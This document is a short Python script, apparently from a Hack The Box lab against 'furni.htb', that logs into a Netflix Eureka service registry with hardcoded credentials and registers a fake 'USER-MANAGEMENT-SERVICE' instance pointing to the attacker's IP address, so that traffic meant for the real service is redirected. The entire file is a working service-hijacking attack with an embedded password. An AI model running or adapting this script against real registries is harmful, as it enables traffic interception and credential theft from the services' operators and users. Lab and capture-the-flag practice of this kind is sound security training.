import sys
import json
import requests

# Target Eureka server details
EUREKA_HOST = "furni.htb"
EUREKA_PORT = "8761"
EUREKA_URI = f"http://EurekaSrvr:0scarPWDisTheB3st@{EUREKA_HOST}:{EUREKA_PORT}"

# Service registration info
SERVICE_NAME = "USER-MANAGEMENT-SERVICE"
SERVICE_PROTOCOL = "http"
SERVICE_HOST = "10.10.16.15"  # Your IP
SERVICE_PORT = 5000

SERVICE_URI = f"{SERVICE_PROTOCOL}://{SERVICE_HOST}:{SERVICE_PORT}"
HOME_URI = f"{SERVICE_URI}/home"
HEALTH_URI = f"{SERVICE_URI}/health"
STATUS_URI = f"{SERVICE_URI}/health"

# Hostname (from command line arg or default)
HOST_NAME = 'localhost:USER-MANAGEMENT-SERVICE:8081'

# Prepare JSON payload
payload = {
    "instance": {
        "instanceId":HOST_NAME,
        "app": SERVICE_NAME,
        "dataCenterInfo": {
            "@class": "com.netflix.appinfo.MyDataCenterInfo",
            "name": "MyOwn"
        },
        "healthCheckUrl": HEALTH_URI,
        "homePageUrl": HOME_URI,
        "hostName": HOST_NAME,
        "ipAddr": SERVICE_HOST,
        "leaseInfo": {
            "evictionDurationInSecs": 90
        },
        "metadata": {
            "owner": "George Harris",
            "cost-code": "1D234R"
        },
        "port": {
            "$": SERVICE_PORT,
            "@enabled": "true"
        },
        "securePort": {
            "$": 443,
            "@enabled": "false"
        },
        "secureVipAddress": SERVICE_NAME,
        "status": "UP",
        "statusPageUrl": STATUS_URI,
        "vipAddress": SERVICE_NAME
    }
}

# Send registration request
headers = {
    "Content-Type": "application/json"
}

response = requests.post(
    f"{EUREKA_URI}/eureka/apps/{SERVICE_NAME}",
    headers=headers,
    data=json.dumps(payload),
    proxies={'http':'http://localhost:8080'}
)

# Print the result
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
